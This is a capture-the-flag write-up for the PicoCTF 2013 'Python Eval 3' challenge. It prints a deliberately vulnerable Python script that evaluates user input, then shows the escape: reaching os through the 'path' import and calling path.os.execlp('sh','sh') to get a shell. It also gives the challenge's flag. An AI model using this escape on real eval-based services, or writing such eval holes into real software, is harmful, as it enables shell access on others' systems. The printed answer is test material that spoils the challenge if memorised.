# PicoCTF 2013: Python Eval 3

**Category:** Script Exploitation
**Points:** 110
**Description:**

> Give Python Eval 1 and 2 a shot before moving on to [Python Eval 3](https://2013.picoctf.com/problems/pyeval/stage3.html).

## Write-up
>This challenge involves exploiting a Python script's input 'eval' function using the script's imports.

> We're given the follwing script and the task of getting a shell to read the flag.

```
# task3.py
# Remember kids: this is bad code. Try not code like this :P
from os import path
del __builtins__.__dict__['__import__']
del __builtins__.__dict__['reload']

print "Welcome to the food menu!"
choices = (
  ("Chicken Asada Burrito", 7.69, "caburrito.txt"),
  ("Beef Chow Mein", 6.69, "beefchow.txt"),
  ("MeatBurger Deluxe", 10.49, "no description"),
  # ...
)

def print_description(n):
  print ""
  if n >= len(choices):
    print "No such item!"
  elif not path.exists(choices[n][2]):
    print "No description yet, but we promise it's tasty!"
  else:
    print open(choices[n][2]).read()

def show_menu():
  for i in xrange(len(choices)):
    print "[% 2d] $% 3.2f %s" % (i, choices[i][1], choices[i][0])

while True:
  print "Which description do you want to read?"
  show_menu()
  print_description(input('> '))
```

> We can see that the ability to import and call a shell has been blocked so we need to look for another way. Opening up a Python interperter from our 
> local machine and checking what the import path gives us reveals an answer.

```
>>> from os import path
>>> dir(path)
['__all__', '__builtins__', '__doc__', '__file__', '__name__', '__package__', '_joinrealpath', '_unicode', '_uvarprog', '_varprog', 'abspath', 'altsep', 'basename', 'commonprefix', 'curdir', 'defpath', 'devnull', 'dirname', 'exists', 'expanduser', 'expandvars', 'extsep', 'genericpath', 'getatime', 'getctime', 'getmtime', 'getsize', 'isabs', 'isdir', 'isfile', 'islink', 'ismount', 'join', 'lexists', 'normcase', 'normpath', 'os', 'pardir', 'pathsep', 'realpath', 'relpath', 'samefile', 'sameopenfile', 'samestat', 'sep', 'split', 'splitdrive', 'splitext', 'stat', 'supports_unicode_filenames', 'sys', 'walk', 'warnings']
```

> The import path contains a reference to the module os so we can simply call a shell using path. Inputting the following commands gives us our answer
```
> path.os.execlp('sh','sh')
> ls
run.sh
task3.py
your_flag_here
> cat your_flag_here
eval_is_super_OSsome
```




**Answer: eval_is_super_OSsome** 

## Other write-ups and resources
* [https://www.uns.vn/picoctf-2013-write-up-python-eval-3/](https://www.uns.vn/picoctf-2013-write-up-python-eval-3/)
* [http://hacktracking.blogspot.com/2014/01/picoctf-2k13-python-eval-3.html](http://hacktracking.blogspot.com/2014/01/picoctf-2k13-python-eval-3.html)
* [https://github.com/james9909/PracticeCTF/tree/master/picoCTF-2013/Python%20Eval%203](https://github.com/james9909/PracticeCTF/tree/master/picoCTF-2013/Python%20Eval%203)
